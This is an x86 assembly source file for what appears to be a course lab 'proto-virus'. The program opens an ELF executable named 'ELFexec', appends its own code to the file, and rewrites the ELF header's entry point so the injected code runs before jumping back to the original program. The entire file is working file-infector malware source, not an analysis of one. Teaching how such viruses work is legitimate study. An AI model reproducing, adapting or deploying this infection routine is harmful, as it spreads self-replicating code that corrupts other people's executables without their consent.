%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define firstInstructionAdrr 0x08048000



%define fd 4
%define fileSize 8
%define elfFile 80
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; start of my code
PrintImVirus:
	call get_my_loc
	add ecx, (OutStr - anchor)
	write 1, ecx, 32

OpenFile:
	call get_my_loc
	add ecx, (FileName - anchor)
	mov eax, ecx
	open eax, RDWR, 0x700
	cmp eax, 0
	jl OpenError
	mov [ebp - fd], eax		;	save file descriptor value in [ebp - 4]

GetFileSize:
	lseek dword [ebp - fd], 0, SEEK_END	;	get file size
	cmp eax, 0
	jl PrintError
	mov [ebp - fileSize], eax	;	save file size value in [ebp - 8]

CopyELFToStack:
	lseek dword [ebp - fd], 0, SEEK_SET		;	return to the start of the file
	lea ebx, [ebp - elfFile]	;	get pointer to elf file
	read dword [ebp - fd], ebx, 52	; copy 52 bytes of the elf header (elf header size) to the stack on [ebp - 64]

CheckIfELF:
	lea ecx, [ebp - elfFile]	;	get pointer to elf file
	cmp dword [ecx], 0x464c457f	;	compare the magic numbers to 0xf7 'E''L''F'
	jne NotELFError
	
AddVirus:
	lseek dword [ebp - fd], 0, SEEK_END		;	return to the start of the file
	call get_my_loc
	add ecx, (_start - anchor)				;	get _start offset
	mov eax, ecx							;	start offset
	mov ebx, ecx
	call get_my_loc
	add ecx, (virus_end - anchor)
	sub ecx, eax
	write dword [ebp - fd], eax, ecx
	cmp eax, 0
	jb PrintError

SetEnd:
	lseek dword [ebp - fd], -4, SEEK_END
	lea ebx, [ebp - elfFile + ENTRY]
	write dword [ebp - fd], ebx, 4

SetEntryPoint:
	lseek dword [ebp - fd], 0, SEEK_SET		;	return to the start of the file
	mov ebx, 0
	mov ebx, firstInstructionAdrr
	add ebx, dword [ebp - fileSize]
	mov dword [ebp - elfFile + ENTRY], ebx
	lea ebx, [ebp - elfFile]
	write dword [ebp - fd], ebx, 52
	close dword [ebp - fd]

JumpToStartOfExecFile:
	call get_my_loc
	add ecx, (PreviousEntryPoint - anchor)
	jmp dword [ecx]
	jmp VirusExit

OpenError:
	call get_my_loc
	add ecx, (OpenErrorStr - anchor)
	mov ebx, ecx
	write 1, ebx, 20
	exit 1

PrintError:
	call get_my_loc
	add ecx, (Failstr - anchor)
	mov ebx, ecx
	write 1, ebx, 13
	exit 1

NotELFError:
	call get_my_loc
	add ecx, (NotElfErrorStr - anchor)
	mov ebx, ecx
	write 1, ebx, 19
	exit 1

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0	; 32 chars
Failstr:        db "perhaps not", 10 , 0	; 13 chars
NotElfErrorStr:	db "File Not ELF File", 10, 0	; 19 chars
OpenErrorStr:	db "File Couldn't Open", 10, 0	; 20 chars

get_my_loc:
        call anchor
anchor:
        pop ecx
        ret

PreviousEntryPoint: dd VirusExit

virus_end: